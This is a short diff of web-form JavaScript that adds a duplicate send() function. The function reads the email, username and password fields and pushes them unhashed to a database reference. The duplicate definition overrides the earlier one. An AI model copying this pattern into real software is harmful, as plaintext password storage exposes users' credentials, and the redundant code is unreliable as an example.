@@ -26,3 +26,15 @@ function send(){
         password: password,
     });
 }
+
+function send(){
+    var email = document.getElementById("email").value;
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+
+    detailsRef.push().set({
+        email: email,
+        username: username,
+        password: password,
+    });
+}
